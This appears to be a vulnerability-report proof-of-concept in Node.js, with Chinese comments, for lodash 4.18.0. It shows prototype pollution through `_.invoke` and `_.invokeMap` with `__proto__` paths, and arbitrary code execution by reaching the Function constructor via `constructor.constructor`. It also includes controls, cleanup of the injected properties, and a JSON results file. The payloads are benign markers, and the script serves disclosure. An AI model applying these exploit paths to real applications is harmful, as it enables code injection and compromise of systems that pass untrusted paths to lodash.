/**
 * PoC: lodash `_.invoke` 原型链污染 / 任意代码执行
 *
 * 目标版本：lodash 4.18.0（截至 2026-11-02 的最新版）
 * 复现：node poc.js
 *
 * 为什么这不是"设计边界"
 * --------------------
 * lodash 官方 threat-model.md「Examples of Vulnerabilities (in scope)」写明：
 *   "If a Lodash function (e.g., merge, defaultsDeep, or set) allows modification
 *    of Object.prototype properties via untrusted input (e.g., __proto__ keys)
 *    due to insufficient sanitization, it is in scope."
 * `e.g.` 是举例而非穷举；`_.invoke` 同样是 Lodash function，同样经由 `__proto__`
 * 改了 Object.prototype，且输入来自调用方传入的 path。
 *
 * 与同版本已修复项的对照（这是"变体"的判定依据）
 * ------------------------------------------
 * 4.18.0 的 patch 给 baseUnset 加了三道 guard，注释原文：
 *   "Block constructor/prototype as non-terminal traversal keys to prevent
 *    escaping the object graph into built-in constructors and prototypes."
 * 而 baseInvoke 一个字没改，走的是同一个 parent(object, path) 取值逻辑。
 * 同一个安全不变量，一处强制、一处缺失。
 */
const path = require('path');
// require 只认绝对路径；传相对路径会被当成模块名去 node_modules 找
const lodashPath = path.resolve(
  process.argv[2] || path.join(__dirname, 'src/lodash-4.18.0/lodash.js'));
const _ = require(lodashPath);

const MARK = 'vhvPoc_' + Math.random().toString(36).slice(2, 8);
const findings = [];

function record(name, passed, detail) {
  findings.push({ name, passed, detail });
  console.log('  [%s] %s', passed ? 'PASS' : 'FAIL', name);
  console.log('        %s', detail);
}

console.log('lodash %s  (%s)', _.VERSION, lodashPath);
console.log('');

// ---- 证明 1：经 __proto__ 调 __defineGetter__，直接污染 Object.prototype ----
console.log('证明 1 — 原型链污染（数组路径）');
_.invoke({}, ['__proto__', '__defineGetter__'], MARK, function () { return 'PWNED'; });
const leaked = ({}[MARK]);
record('_.invoke + __defineGetter__ 污染全局原型', leaked === 'PWNED',
  '新建空对象 ({}).' + MARK + ' === ' + JSON.stringify(leaked));
delete Object.prototype[MARK];

// ---- 证明 2：字符串路径同样有效（说明不是数组特例）----
console.log('证明 2 — 原型链污染（字符串路径）');
const MARK2 = MARK + '_s';
_.invoke({}, '__proto__.__defineGetter__', MARK2, function () { return 'PWNED2'; });
record('_.invoke 字符串路径', ({}[MARK2]) === 'PWNED2',
  '({}).' + MARK2 + ' === ' + JSON.stringify(({}[MARK2])));
delete Object.prototype[MARK2];

// ---- 证明 3：经 constructor.constructor 拿到 Function，构造并执行任意代码 ----
console.log('证明 3 — 任意代码执行');
let execResult = null;
try {
  const fn = _.invoke({}, ['__proto__', 'constructor', 'constructor'], 'return process.version');
  execResult = (typeof fn === 'function') ? fn() : null;
} catch (e) { execResult = 'threw: ' + e.message; }
record('_.invoke 构造并执行任意 JS', typeof execResult === 'string' && execResult.indexOf('v') === 0,
  '构造出的函数执行结果 = ' + JSON.stringify(execResult));

// ---- 证明 4：invokeMap 同样受影响 ----
console.log('证明 4 — invokeMap 同样受影响');
const MARK3 = MARK + '_m';
_.invokeMap([{}], ['__proto__', '__defineGetter__'], MARK3, function () { return 'PWNED3'; });
record('_.invokeMap', ({}[MARK3]) === 'PWNED3',
  '({}).' + MARK3 + ' === ' + JSON.stringify(({}[MARK3])));
delete Object.prototype[MARK3];

// ---- 对照：同版本 _.unset 对同一路径返回 false（被 guard 拦住）----
console.log('对照 — 同版本 _.unset 的同一路径');
const unsetRet = _.unset({}, ['__proto__', '__defineGetter__']);
record('_.unset 被拦（证明不一致性真实存在）', unsetRet === false,
  '_.unset({}, ["__proto__","__defineGetter__"]) === ' + JSON.stringify(unsetRet));

// ---- 阴性对照：正常路径调用不该被误判 ----
console.log('对照 — 正常调用');
const MARK4 = MARK + '_n';
const normalObj = { m: function () { return 'ok'; } };
const normalRet = _.invoke(normalObj, 'm');
record('正常 _.invoke 行为不变（修复不应破坏功能）', normalRet === 'ok',
  '_.invoke({m(){return "ok"}}, "m") === ' + JSON.stringify(normalRet));

console.log('');
const pass = findings.filter(f => f.passed).length;
console.log('结果: %d/%d', pass, findings.length);
console.log(pass === findings.length ? '全部成立' : '★ 有未成立的项，需人工复核');

require('fs').writeFileSync(
  path.join(__dirname, 'poc_' + _.VERSION + '.json'),
  JSON.stringify({ lodash: _.VERSION, lodashPath, node: process.version, findings }, null, 2)
);
